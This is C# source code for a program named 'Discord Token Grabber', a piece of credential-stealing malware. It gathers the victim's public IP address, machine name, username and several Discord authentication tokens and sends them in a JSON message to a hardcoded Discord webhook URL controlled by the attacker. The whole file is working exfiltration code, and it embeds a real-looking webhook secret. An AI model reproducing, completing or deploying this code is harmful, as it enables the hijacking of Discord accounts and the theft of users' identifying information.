using System;
using System.Collections.Generic;
using System.Collections.Specialized;
using System.Linq;
using System.Net;
using System.Text;
using System.Threading.Tasks;

namespace Token_Grabber
{
    public class PrintAllInfo
    {
        public static string weblink = ("https://api.ipify.org/");
        public PrintAllInfo()
        {
            GetIp();
            SendInfo();
        }

        static void SendInfo()
        {
            //Discord webhook url
            string url = "https://discord.com/api/webhooks/959071811419652096/dOkV-5nK6JXpqa-86ODdZfbkAaV9UhJ9fzlLf3Ta-35SmGYjkY_XZCxGsYdAfbERDZUT";
            string json = "{\"username\": \"Discord Token Grabber\",\"embeds\":[ {\"description\": \" \\n \\n \\n \\n \\n \\n\", \"title\":\"Info:\", \"color\":1018364}] }";
            
            int IpLength = GetInfo.Ip.Length;
            int UsernameLength = GetInfo.Username.Length;
            int PCNameLength = GetInfo.PCName.Length;


            string newjson = json.Insert(65, $"{GetInfo.Ip}");

            newjson = newjson.Insert(68 + IpLength, $"{GetInfo.Username}");
            newjson = newjson.Insert(71 + UsernameLength + IpLength, $"{GetInfo.PCName}");
            newjson = newjson.Insert(77 + UsernameLength + IpLength + PCNameLength, $"{GetInfo.Token1}");
            newjson = newjson.Insert(77 + UsernameLength + IpLength + PCNameLength + GetInfo.Token2.Length, $"{GetInfo.Token5}");

            
            
            SendDiscordWebhook(url, newjson);
        }

        public static void SendDiscordWebhook(string URL, string escapedjson)
        {
            var wr = WebRequest.Create(URL);
            wr.ContentType = "application/json";
            wr.Method = "POST";
            using (var sw = new StreamWriter(wr.GetRequestStream()))
                sw.Write(escapedjson);
            wr.GetResponse();
        }

        public static string GetIp()
        {
            string ip = new WebClient().DownloadString(weblink);
            return ip;
        }


    }

    public class GetInfo
    {
        public static string Ip = PrintAllInfo.GetIp();
        public static string PCName = Environment.MachineName;
        public static string Username = Environment.UserName;
        public static string Token1 = DiscordToken.matchs[0];
        public static string Token2 = DiscordToken.matchs[1];
        public static string Token3 = DiscordToken.matchs[2];
        public static string Token4 = DiscordToken.matchs[3];
        public static string Token5 = DiscordToken.matchs[4];
        public static string Token6 = DiscordToken.matchs[5];

    }
}
